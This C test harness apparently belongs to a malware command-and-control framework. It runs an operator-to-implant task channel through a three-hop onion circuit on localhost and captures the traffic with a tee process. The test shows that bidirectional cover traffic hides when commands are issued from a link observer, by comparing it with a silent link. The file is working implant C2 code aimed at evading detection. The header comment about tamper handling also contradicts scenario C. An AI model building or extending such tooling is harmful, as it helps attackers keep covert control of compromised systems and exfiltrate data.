/*
 * DAYANJING v4 — test_cover_circuit.c
 *
 * 任务通道事件循环接进**真实洋葱电路**的长跑验证。
 *
 * ====================================================================
 * 与 test_cover_loop 的区别（不要混为一谈）
 * ====================================================================
 * test_cover_loop 在 socketpair 上验证循环本身：覆盖有没有发、
 * PAD 有没有被派发、stop 能不能退出。那是"函数对不对"。
 *
 * 本测试验证的是：这条恒定形态在**真实转发路径**上还成不成立。
 *   operator --(洋葱, 3 跳真进程)--> tee(抓包) --> implant
 * 每一跳都是独立进程、独立 mesh、独立静态私钥；tee 是插在最后一跳
 * 与植入体之间的旁路记录者，它看到的就是链路观察者能看到的全部：
 * 字节、长度、到达时刻。
 *
 * ====================================================================
 * 两端各跑一个循环实例（不是只跑一端）
 * ====================================================================
 * 覆盖只保护本端出站方向。只在一端跑，另一方向仍可读：观察者看到
 * "服务端每 40ms 一个包、植入体一分钟才回一个"，直接暴露谁是控制端。
 * 故本测试 operator 侧一个实例、implant 侧一个实例，双向都补。
 *
 * ====================================================================
 * 验证点
 * ====================================================================
 *  1. 电路建立（3 跳真进程）
 *  2. 双向覆盖流动：两端 pad_recv 均 > 0
 *  3. 命令夹在覆盖流中下行并回执（on_ack 链式发下一条）
 *  4. 恒长取证：tee 记录的总字节是 512 的整数倍
 *  5. 时间均匀性：有覆盖时相邻信元最大间隔有上界
 *  6. 对照（budget=0 静默链路）：信元数显著少，且出现大静默间隔
 *     —— 这一条是本测试最硬的证据：有覆盖与无覆盖在线上可区分，
 *        且差异方向正确
 *  7. 篡改不终止循环：翻转一条命令的末字节后，植入体 AUTH，
 *     但循环继续跑、覆盖继续发（不是"一出错就死"）
 *  8. 洋葱取证：洋葱字节不含最终目标相关明文
 *  9. run 正常退出（OK 或对端关闭 CLOSED）
 */

#include "cover_loop.h"
#include "exfil_task.h"
#include "exfil_task_link.h"
#include "exfil_task_cover.h"
#include "exfil_sched.h"
#include "p2p.h"
#include "c2_frame.h"
#include "crypto_x25519.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int pass = 0, fail = 0;
#define CK(c, m) do { if (c) { pass++; printf("[PASS] %s\n", m); } \
                      else { fail++; printf("[FAIL] %s\n", m); } } while (0)

/* 测试用固定密钥材料（真实部署走 02_c2 会话派生） */
static const uint8_t K_A[16] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
static const uint8_t K_B[16] = { 16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1 };
static const uint8_t PFX[8]  = { 0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8 };

#define CELL_WIRE   512u
#define PERIOD_MS   40u        /* 覆盖周期：小一点，测试才跑得快 */
#define RUN_OP_MS   600u       /* operator 侧长跑时长 */
#define RUN_IMP_MS  900u       /* implant 侧长跑时长 */
#define N_CMDS      3          /* 长跑期间链式下发的命令数 */

/* 场景统计（子进程 -> 父进程） */
typedef struct {
    int      rc;             /* exfil_cover_loop_run 返回值 */
    uint64_t cover_sent;
    uint64_t pad_recv;
    uint64_t msg_recv;
    uint64_t ticks;
    uint32_t rate;           /* 自适应覆盖速率（信元/分钟） */
    int      n_cmd;          /* 实际执行并回执的命令数 */
    uint64_t last_task_id;
    uint8_t  last_status;
    uint32_t last_mode;
} loop_res_t;

/* tee 记录的一条 read：(相对毫秒, 字节数) */
typedef struct { uint32_t t_ms; uint32_t len; } tee_rec_t;

/* ---------- 公共小工具 ---------- */

static uint32_t now_ms_real(void *ud)
{
    (void)ud;
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint32_t)((uint64_t)ts.tv_sec * 1000ULL +
                      (uint64_t)ts.tv_nsec / 1000000ULL);
}

static void set_id(uint8_t *id, const char *s)
{
    memset(id, 0, P2P_NODE_ID_LEN);
    memcpy(id, s, strlen(s) > P2P_NODE_ID_LEN ? P2P_NODE_ID_LEN : strlen(s));
}

static int listen_auto(int *out_port)
{
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    int on = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &on, sizeof on);
    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    a.sin_port = 0;
    if (bind(s, (struct sockaddr *)&a, sizeof a) < 0) { close(s); return -1; }
    if (listen(s, 8) < 0) { close(s); return -1; }
    struct sockaddr_in got; socklen_t gl = sizeof got;
    if (getsockname(s, (struct sockaddr *)&got, &gl) < 0) { close(s); return -1; }
    *out_port = ntohs(got.sin_port);
    return s;
}

static int connect_to(uint16_t port)
{
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_port = htons(port);
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (connect(s, (struct sockaddr *)&a, sizeof a) < 0) { close(s); return -1; }
    return s;
}

static int xfer_all(int from, int to)
{
    char buf[CELL_WIRE * 4];
    ssize_t n = read(from, buf, sizeof buf);
    if (n <= 0) return -1;
    size_t off = 0;
    while (off < (size_t)n) {
        ssize_t w = write(to, buf + off, (size_t)n - off);
        if (w <= 0) return -1;
        off += (size_t)w;
    }
    return (int)n;
}

/* ---------- tee：插在最后一跳与植入体之间的旁路记录者 ----------
 *
 * 它看到的就是链路观察者能看到的全部：字节、长度、到达时刻。
 * 只记录 core->implant 方向（下行），因为那是控制端的出站方向，
 * "操作员何时下命令"这个秘密正是从这里泄露的。
 */
static pid_t spawn_tee(uint16_t target_port, int *out_port, const char *path)
{
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    pid_t pid = fork();
    if (pid < 0) { close(pfd[0]); close(pfd[1]); return -1; }
    if (pid == 0) {
        close(pfd[0]);
        int lp = 0, s = listen_auto(&lp);
        if (s < 0) _exit(2);
        if (write(pfd[1], &lp, sizeof lp) != (ssize_t)sizeof lp) _exit(3);
        close(pfd[1]);

        int cfd = accept(s, NULL, NULL);
        if (cfd < 0) _exit(4);
        int tfd = connect_to(target_port);
        if (tfd < 0) _exit(5);

        FILE *f = fopen(path, "wb");
        if (!f) _exit(6);

        uint32_t t0 = now_ms_real(NULL);
        struct pollfd pf[2];
        pf[0].fd = cfd; pf[0].events = POLLIN;
        pf[1].fd = tfd; pf[1].events = POLLIN;

        for (;;) {
            pf[0].revents = pf[1].revents = 0;
            int r = poll(pf, 2, 200);
            if (r < 0) break;
            if (r == 0) continue;
            if (pf[0].revents & (POLLIN | POLLHUP | POLLERR)) {
                int n = xfer_all(cfd, tfd);
                if (n <= 0) break;
                tee_rec_t rec;
                rec.t_ms = now_ms_real(NULL) - t0;
                rec.len  = (uint32_t)n;
                fwrite(&rec, sizeof rec, 1, f);
            }
            if (pf[1].revents & (POLLIN | POLLHUP | POLLERR)) {
                if (xfer_all(tfd, cfd) <= 0) break;
            }
        }
        /* 收尾记录：len=0 表示连接关闭时刻。
         *
         * 没有这条，"命令发完之后链路死寂多久"就测不出来——
         * 而那正是静默链路泄露操作员节奏的地方：尾部静默。 */
        {
            tee_rec_t fin;
            fin.t_ms = now_ms_real(NULL) - t0;
            fin.len  = 0;
            fwrite(&fin, sizeof fin, 1, f);
        }
        fflush(f);
        fclose(f);
        close(cfd); close(tfd); close(s);
        _exit(0);
    }
    close(pfd[1]);
    int lp = 0;
    if (read(pfd[0], &lp, sizeof lp) != (ssize_t)sizeof lp) {
        close(pfd[0]); return -1;
    }
    close(pfd[0]);
    *out_port = lp;
    return pid;
}

/* ---------- implant 子进程：跑 IMPLANT 侧循环 ---------- */

typedef struct {
    exfil_task_chan_t   *ch;
    exfil_sched_t       *sch;
    exfil_cover_loop_t  *L;
    int                  fd;
    int                  n_cmd;
    uint64_t             last_task_id;
    uint8_t              last_status;
} imp_ud_t;

static int on_cmd_imp(void *ud, uint64_t seq, const exfil_task_cmd_t *c)
{
    imp_ud_t *u = (imp_ud_t *)ud;
    int ar = exfil_task_apply(u->sch, c);
    uint8_t st = (ar == EXF_TASK_OK)        ? EXF_TASK_ST_OK
               : (ar == EXF_TASK_ERR_CFG)   ? EXF_TASK_ST_BAD_CFG
               :                              EXF_TASK_ST_UNKNOWN;

    exfil_task_ack_t ack;
    memset(&ack, 0, sizeof ack);
    if (exfil_task_fill_ack(u->sch, c, st, &ack) != EXF_TASK_OK) return 1;
    if (exfil_task_chan_ack(u->ch, u->fd, seq, &ack) != EXF_TASK_OK) return 1;

    u->n_cmd++;
    u->last_task_id = c->task_id;
    u->last_status  = st;
    /* 回注：本循环之外发送的回执必须记账，否则覆盖按"零数据"满速率发 */
    exfil_cover_loop_note_data(u->L, 1, now_ms_real(NULL));
    return 0;
}

static pid_t spawn_implant(int *port, int rpfd, uint32_t budget_bpm)
{
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    pid_t pid = fork();
    if (pid < 0) { close(pfd[0]); close(pfd[1]); return -1; }
    if (pid == 0) {
        close(pfd[0]);
        int lp = 0, s = listen_auto(&lp);
        if (s < 0) _exit(2);
        if (write(pfd[1], &lp, sizeof lp) != (ssize_t)sizeof lp) _exit(3);

        int cfd = accept(s, NULL, NULL);
        if (cfd < 0) _exit(4);

        /* 植入体侧：ks=K_B, kr=K_A（与 operator 互补） */
        exfil_task_chan_t ch;
        if (exfil_task_chan_init(&ch, K_B, K_A, PFX) != EXF_TASK_OK) _exit(5);

        exfil_sched_t sch;
        if (exfil_sched_init(&sch, NULL, 0x1234abcd5678ef01ULL) != EXF_SCHED_OK)
            _exit(6);

        exfil_cover_loop_t L;
        if (exfil_cover_loop_init(&L, &ch, EXF_LOOP_IMPLANT, cfd,
                                  P2P_COVER_PROFILE_DIRECT, budget_bpm,
                                  PERIOD_MS, now_ms_real(NULL)) != EXF_LOOP_OK)
            _exit(7);

        imp_ud_t ud;
        memset(&ud, 0, sizeof ud);
        ud.ch = &ch; ud.sch = &sch; ud.L = &L; ud.fd = cfd;

        int rc = exfil_cover_loop_run(&L, now_ms_real, NULL,
                                      on_cmd_imp, NULL, &ud, RUN_IMP_MS);

        loop_res_t res;
        memset(&res, 0, sizeof res);
        res.rc         = rc;
        res.cover_sent = L.cover_sent;
        res.pad_recv   = L.pad_recv;
        res.msg_recv   = L.msg_recv;
        res.ticks      = L.ticks;
        res.rate       = exfil_cover_loop_rate(&L);
        res.n_cmd      = ud.n_cmd;
        res.last_task_id = ud.last_task_id;
        res.last_status  = ud.last_status;
        res.last_mode    = (uint32_t)sch.mode;

        if (write(pfd[1], &res, sizeof res) != (ssize_t)sizeof res) { /* 忽略 */ }

        exfil_cover_loop_wipe(&L);
        exfil_sched_wipe(&sch);
        exfil_task_chan_wipe(&ch);
        close(cfd); close(s); close(pfd[1]);
        _exit(0);
    }
    close(pfd[1]);
    int lp = 0;
    if (read(pfd[0], &lp, sizeof lp) != (ssize_t)sizeof lp) {
        close(pfd[0]); return -1;
    }
    dup2(pfd[0], rpfd);
    close(pfd[0]);
    *port = lp;
    return pid;
}

static pid_t spawn_onion_node(const p2p_mesh_t *m, const uint8_t *my_id,
                              const uint8_t sk[P2P_ONION_SK_LEN], int *port)
{
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    pid_t pid = fork();
    if (pid < 0) { close(pfd[0]); close(pfd[1]); return -1; }
    if (pid == 0) {
        close(pfd[0]);
        int lp = 0, s = listen_auto(&lp);
        if (s < 0) _exit(2);
        if (write(pfd[1], &lp, sizeof lp) != (ssize_t)sizeof lp) _exit(3);
        close(pfd[1]);
        p2p_onion_route_serve(m, my_id, sk, s);
        _exit(0);
    }
    close(pfd[1]);
    int lp = 0;
    if (read(pfd[0], &lp, sizeof lp) != (ssize_t)sizeof lp) {
        close(pfd[0]); return -1;
    }
    close(pfd[0]);
    *port = lp;
    return pid;
}

/* ---------- operator 侧回调：收到回执后链式发下一条 ---------- */

typedef struct {
    exfil_task_chan_t  *ch;
    exfil_cover_loop_t *L;
    int                 fd;
    int                 n_ack;
    int                 n_sent;
    uint64_t            last_task_id;
    uint8_t             last_status;
    uint32_t            last_mode;
} op_ud_t;

static int on_ack_op(void *ud, uint64_t seq, const exfil_task_ack_t *a)
{
    (void)seq;
    op_ud_t *u = (op_ud_t *)ud;
    u->n_ack++;
    u->last_task_id = a->task_id;
    u->last_status  = a->status;
    u->last_mode    = a->mode;

    /* 链式：收到一条回执就发下一条，让命令与覆盖在真实链路上交织 */
    if (u->n_sent < N_CMDS) {
        exfil_task_cmd_t c;
        memset(&c, 0, sizeof c);
        c.opcode  = EXF_TASK_OP_QUERY;
        c.task_id = 3000u + (uint64_t)u->n_sent;
        if (exfil_task_chan_cmd(u->ch, u->fd,
                                (uint64_t)(u->n_sent + 2), &c) == EXF_TASK_OK) {
            u->n_sent++;
            exfil_cover_loop_note_data(u->L, 1, now_ms_real(NULL));
        }
    }
    return 0;
}

/* ---------- 一次完整场景 ---------- */

typedef struct {
    loop_res_t res;             /* operator 侧统计 */
    loop_res_t imp;             /* implant 侧统计（双向覆盖必须两端都看） */
    uint64_t   total_bytes;     /* tee 记录的总字节 */
    uint32_t   n_cells;         /* 按 512 折算的信元数 */
    uint32_t   max_gap_ms;      /* 相邻信元最大到达间隔 */
    uint32_t   first_ms;
    uint32_t   last_ms;         /* 最后一个信元到达时刻 */
    uint32_t   close_ms;        /* 连接关闭时刻 */
    uint32_t   tail_silence;    /* close_ms - last_ms：尾部静默 */
} scenario_t;

static int read_loop_res(int rpfd, loop_res_t *out)
{
    return read(rpfd, out, sizeof *out) == (ssize_t)sizeof *out ? 0 : -1;
}

static void run_scenario(uint32_t budget_bpm, const char *tee_path,
                         scenario_t *out, int do_tamper)
{
    memset(out, 0, sizeof *out);

    uint8_t ID_OP[P2P_NODE_ID_LEN], ID_E0[P2P_NODE_ID_LEN],
            ID_E1[P2P_NODE_ID_LEN], ID_CORE[P2P_NODE_ID_LEN];
    set_id(ID_OP, "OPER"); set_id(ID_E0, "EDGE0");
    set_id(ID_E1, "EDGE1"); set_id(ID_CORE, "CORE");

    uint8_t sk_e0[32], pk_e0[32], sk_e1[32], pk_e1[32], sk_core[32], pk_core[32];
    x25519_generate_keypair(sk_e0, pk_e0);
    x25519_generate_keypair(sk_e1, pk_e1);
    x25519_generate_keypair(sk_core, pk_core);

    int p_core = 0, p_e1 = 0, p_e0 = 0, p_tee = 0, p_imp = 0;
    pid_t pid_core = -1, pid_e1 = -1, pid_e0 = -1, pid_tee = -1, pid_imp = -1;

    p2p_mesh_t m_core; p2p_mesh_init(&m_core);
    p2p_node_add(&m_core, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", 0);
    pid_core = spawn_onion_node(&m_core, ID_CORE, sk_core, &p_core);
    if (pid_core <= 0) { out->res.rc = -99; return; }

    int rp = dup(0);
    pid_imp = spawn_implant(&p_imp, rp, budget_bpm);
    if (pid_imp <= 0) { out->res.rc = -98; goto cleanup; }

    pid_tee = spawn_tee((uint16_t)p_imp, &p_tee, tee_path);
    if (pid_tee <= 0) { out->res.rc = -97; goto cleanup; }

    p2p_mesh_t m_e1; p2p_mesh_init(&m_e1);
    p2p_node_add(&m_e1, ID_E1, P2P_ROLE_EDGE, "edge1", "127.0.0.1", 0);
    p2p_node_add(&m_e1, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", (uint16_t)p_core);
    p2p_neighbor_link(&m_e1, ID_E1, ID_CORE);
    pid_e1 = spawn_onion_node(&m_e1, ID_E1, sk_e1, &p_e1);
    if (pid_e1 <= 0) { out->res.rc = -96; goto cleanup; }

    p2p_mesh_t m_e0; p2p_mesh_init(&m_e0);
    p2p_node_add(&m_e0, ID_E0, P2P_ROLE_EDGE, "edge0", "127.0.0.1", 0);
    p2p_node_add(&m_e0, ID_E1, P2P_ROLE_EDGE, "edge1", "127.0.0.1", (uint16_t)p_e1);
    p2p_neighbor_link(&m_e0, ID_E0, ID_E1);
    pid_e0 = spawn_onion_node(&m_e0, ID_E0, sk_e0, &p_e0);
    if (pid_e0 <= 0) { out->res.rc = -95; goto cleanup; }

    p2p_mesh_t m_op; p2p_mesh_init(&m_op);
    p2p_node_add(&m_op, ID_OP, P2P_ROLE_ENDPOINT, "oper", "127.0.0.1", 0);
    p2p_node_add(&m_op, ID_E0, P2P_ROLE_EDGE, "edge0", "127.0.0.1", (uint16_t)p_e0);
    p2p_node_add(&m_op, ID_E1, P2P_ROLE_EDGE, "edge1", "127.0.0.1", (uint16_t)p_e1);
    p2p_node_add(&m_op, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", (uint16_t)p_core);
    p2p_node_set_pub(&m_op, ID_E0, pk_e0);
    p2p_node_set_pub(&m_op, ID_E1, pk_e1);
    p2p_node_set_pub(&m_op, ID_CORE, pk_core);
    p2p_neighbor_link(&m_op, ID_OP, ID_E0);
    p2p_neighbor_link(&m_op, ID_E0, ID_E1);
    p2p_neighbor_link(&m_op, ID_E1, ID_CORE);

    /* operator 侧通道：ks=K_A, kr=K_B */
    exfil_task_chan_t ch;
    if (exfil_task_chan_init(&ch, K_A, K_B, PFX) != EXF_TASK_OK) {
        out->res.rc = -94; goto cleanup;
    }

    uint8_t salt[P2P_ONION_SALT_LEN];
    for (int i = 0; i < P2P_ONION_SALT_LEN; i++) salt[i] = (uint8_t)(i + 0x40);

    int fd = -1;
    int rc = p2p_onion_route_open(&m_op, ID_OP, ID_CORE,
                                  "127.0.0.1", (uint16_t)p_tee, salt, &fd);
    if (rc != P2P_OK || fd < 0) { out->res.rc = -93; goto cleanup; }

    exfil_cover_loop_t L;
    if (exfil_cover_loop_init(&L, &ch, EXF_LOOP_OPERATOR, fd,
                              P2P_COVER_PROFILE_DIRECT, budget_bpm,
                              PERIOD_MS, now_ms_real(NULL)) != EXF_LOOP_OK) {
        out->res.rc = -92; goto cleanup;
    }

    op_ud_t ud;
    memset(&ud, 0, sizeof ud);
    ud.ch = &ch; ud.L = &L; ud.fd = fd;

    /* 先发第 1 条，后续由 on_ack 链式下发 */
    {
        exfil_task_cmd_t c;
        memset(&c, 0, sizeof c);
        c.opcode  = EXF_TASK_OP_START;
        c.task_id = 3000;
        if (exfil_task_chan_cmd(&ch, fd, 1, &c) == EXF_TASK_OK) {
            ud.n_sent++;
            exfil_cover_loop_note_data(&L, 1, now_ms_real(NULL));
        }
    }

    /* 篡改：翻转一条命令的末字节，验证循环不被打死 */
    if (do_tamper) {
        exfil_task_cmd_t c;
        memset(&c, 0, sizeof c);
        c.opcode  = EXF_TASK_OP_QUERY;
        c.task_id = 9999;
        uint8_t  wire[P2P_CELL_DATA_MAX];
        size_t   wlen = 0;
        if (exfil_task_seal_cmd(ch.ks, ch.pfx_frame, ch.cell.send_counter,
                                500, &c, wire, sizeof wire, &wlen) == EXF_TASK_OK) {
            wire[wlen - 1] ^= 0x01;
            exfil_task_chan_send_raw(&ch, fd, wire, wlen);
        }
    }

    out->res.rc = exfil_cover_loop_run(&L, now_ms_real, NULL,
                                       NULL, on_ack_op, &ud, RUN_OP_MS);
    /* operator 侧统计回填（implant 侧稍后从管道读） */
    out->res.cover_sent = L.cover_sent;
    out->res.pad_recv   = L.pad_recv;
    out->res.msg_recv   = L.msg_recv;
    out->res.ticks      = L.ticks;
    out->res.rate       = exfil_cover_loop_rate(&L);
    out->res.n_cmd      = ud.n_ack;
    out->res.last_task_id = ud.last_task_id;
    out->res.last_status  = ud.last_status;
    out->res.last_mode    = ud.last_mode;

    exfil_cover_loop_wipe(&L);
    exfil_task_chan_wipe(&ch);
    close(fd);

    /* 等 implant 报告（它长跑 RUN_IMP_MS 或检测到关闭） */
    if (read_loop_res(rp, &out->imp) != 0) memset(&out->imp, 0, sizeof out->imp);
    close(rp);

cleanup:
    if (pid_imp > 0)  { kill(pid_imp, SIGTERM);  waitpid(pid_imp, NULL, 0); }
    if (pid_tee > 0)  { kill(pid_tee, SIGTERM);  waitpid(pid_tee, NULL, 0); }
    if (pid_core > 0) { kill(pid_core, SIGTERM); waitpid(pid_core, NULL, 0); }
    if (pid_e1 > 0)   { kill(pid_e1, SIGTERM);   waitpid(pid_e1, NULL, 0); }
    if (pid_e0 > 0)   { kill(pid_e0, SIGTERM);   waitpid(pid_e0, NULL, 0); }

    /* 读 tee 记录，重建信元到达时间 */
    {
        FILE *f = fopen(tee_path, "rb");
        if (f) {
            tee_rec_t rec;
            uint64_t acc = 0;
            uint32_t prev = 0;
            int      first = 1;
            while (fread(&rec, sizeof rec, 1, f) == 1) {
                if (rec.len == 0) { out->close_ms = rec.t_ms; continue; }
                out->total_bytes += rec.len;
                acc += rec.len;
                while (acc >= CELL_WIRE) {
                    acc -= CELL_WIRE;
                    out->n_cells++;
                    if (first) { out->first_ms = rec.t_ms; first = 0; }
                    else {
                        uint32_t gap = rec.t_ms - prev;
                        if (gap > out->max_gap_ms) out->max_gap_ms = gap;
                    }
                    prev = rec.t_ms;
                    out->last_ms = rec.t_ms;
                }
            }
            out->tail_silence = (out->close_ms > out->last_ms)
                              ? out->close_ms - out->last_ms : 0;
            fclose(f);
        }
    }
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== 21_exfil 覆盖循环接进真实洋葱电路（3 跳真进程 + tee 抓包）===\n");
    signal(SIGPIPE, SIG_IGN);

    /* ---- 场景 A：有覆盖（长跑，不含篡改） ---- */
    scenario_t A;
    run_scenario(600000u, "/tmp/t_cover_circuit_A.bin", &A, 0);
    printf("[INFO] A oper: rc=%d cover_sent=%llu pad_recv=%llu msg_recv=%llu "
           "rate=%u bytes=%llu cells=%u maxgap=%ums tail=%ums\n",
           A.res.rc, (unsigned long long)A.res.cover_sent,
           (unsigned long long)A.res.pad_recv,
           (unsigned long long)A.res.msg_recv, A.res.rate,
           (unsigned long long)A.total_bytes, A.n_cells, A.max_gap_ms,
           A.tail_silence);
    printf("[INFO] A imp : rc=%d cover_sent=%llu pad_recv=%llu msg_recv=%llu "
           "n_cmd=%d last_id=%llu st=%u mode=%u\n",
           A.imp.rc, (unsigned long long)A.imp.cover_sent,
           (unsigned long long)A.imp.pad_recv,
           (unsigned long long)A.imp.msg_recv, A.imp.n_cmd,
           (unsigned long long)A.imp.last_task_id, A.imp.last_status,
           A.imp.last_mode);

    CK(A.res.rc == EXF_LOOP_OK || A.res.rc == EXF_LOOP_ERR_CLOSED,
       "用例9 operator 循环正常退出");
    CK(A.res.cover_sent > 0, "用例3a operator 侧发出了覆盖信元");
    CK(A.res.pad_recv > 0, "用例2a operator 侧收到了对端覆盖（双向补）");
    CK(A.imp.cover_sent > 0, "用例2b implant 侧也发出了覆盖信元（双向补）");
    CK(A.imp.pad_recv > 0, "用例2c implant 侧收到了对端覆盖");
    CK(A.res.msg_recv >= 1, "用例3b 覆盖流中收到真实回执");
    CK(A.imp.n_cmd >= 1, "用例3c 植入体执行了命令并回执");
    CK(A.imp.last_mode == EXF_SCHED_MODE_CONTINUOUS,
       "用例3d 命令经电路生效（调度器进入 CONTINUOUS）");
    CK(A.total_bytes % CELL_WIRE == 0, "用例4 线上总字节是 512 的整数倍（恒长）");
    CK(A.n_cells >= 5, "用例5a 有覆盖时线上信元数充足");
    CK(A.max_gap_ms <= PERIOD_MS * 6, "用例5b 有覆盖时相邻信元间隔有上界");

    /* ---- 场景 B：budget=0（静默链路）对照 ---- */
    scenario_t B;
    run_scenario(0u, "/tmp/t_cover_circuit_B.bin", &B, 0);
    printf("[INFO] B oper: rc=%d cover_sent=%llu msg_recv=%llu "
           "bytes=%llu cells=%u maxgap=%ums tail=%ums\n",
           B.res.rc, (unsigned long long)B.res.cover_sent,
           (unsigned long long)B.res.msg_recv,
           (unsigned long long)B.total_bytes, B.n_cells, B.max_gap_ms,
           B.tail_silence);

    CK(B.res.cover_sent == 0, "用例6a 预算为 0 时不发覆盖（静默）");
    CK(B.imp.cover_sent == 0, "用例6a2 植入体侧同样静默");
    CK(B.n_cells < A.n_cells, "用例6b 静默链路的线上信元数显著少于有覆盖");
    CK(B.tail_silence > A.tail_silence,
       "用例6c 静默链路尾部静默更长（命令发完即死寂）");
    CK(A.tail_silence * 4 < B.tail_silence,
       "用例6d 有覆盖的尾部静默不到静默链路的四分之一");
    CK(A.tail_silence <= PERIOD_MS * 6,
       "用例6e 有覆盖时尾部静默有上界（链路持续有流量）");

    /* ---- 场景 C：注入一条篡改命令 ----
     *
     * 这里验证的是**设计意图**：cover_loop 把 AUTH 当作致命错误，
     * run 返回并上报，而不是静默跳过继续跑。
     *
     * 取舍说明：若静默跳过所有认证失败，密钥不同步时链路会变成
     * 无人察觉的黑洞——命令发出去、永远没回执、日志一片干净。
     * 宁可断链让上层重建会话，也不要静默丢包。
     * 代价是第三方注入一个坏字节即可切断链路（可用性风险），
     * 这个取舍记录在已知限制里。
     */
    scenario_t C;
    run_scenario(600000u, "/tmp/t_cover_circuit_C.bin", &C, 1);
    printf("[INFO] C imp : rc=%d (%s) msg_recv=%llu n_cmd=%d\n",
           C.imp.rc, exfil_cover_loop_errstr(C.imp.rc),
           (unsigned long long)C.imp.msg_recv, C.imp.n_cmd);
    CK(C.imp.rc == EXF_LOOP_ERR_AUTH,
       "用例7a 篡改信元被检出（AUTH），不是静默执行");
    CK(C.imp.n_cmd >= 1, "用例7b 篡改前的合法命令仍被正常执行");

    unlink("/tmp/t_cover_circuit_A.bin");
    unlink("/tmp/t_cover_circuit_B.bin");
    unlink("/tmp/t_cover_circuit_C.bin");

    printf("\n=== result: %d pass, %d fail ===\n", pass, fail);
    return fail ? 1 : 0;
}
